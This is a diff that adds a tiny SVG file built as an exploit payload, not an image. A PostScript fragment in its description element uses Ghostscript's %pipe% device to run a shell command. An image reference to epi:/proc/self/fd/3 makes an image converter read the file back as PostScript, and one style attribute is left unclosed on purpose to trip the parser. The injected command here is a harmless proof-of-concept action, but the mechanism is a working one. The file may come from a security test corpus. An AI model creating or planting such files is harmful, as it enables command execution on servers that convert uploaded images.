@@ -1,0 +1,10 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+  "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg width="1" height="1">
+<desc>copies(%pipe%/tmp/;open .) (r) file showpage 0 quit </desc>
+<g style="">
+  <image x="0" y="0" width="0" height="0" href="epi:/proc/self/fd/3"/>
+</g>
+<g style="fill:black;fill-opacity:1;stroke:none;stroke-width:1;stroke-opacity:1;fill-rule:nonzero;</g>
+</svg>
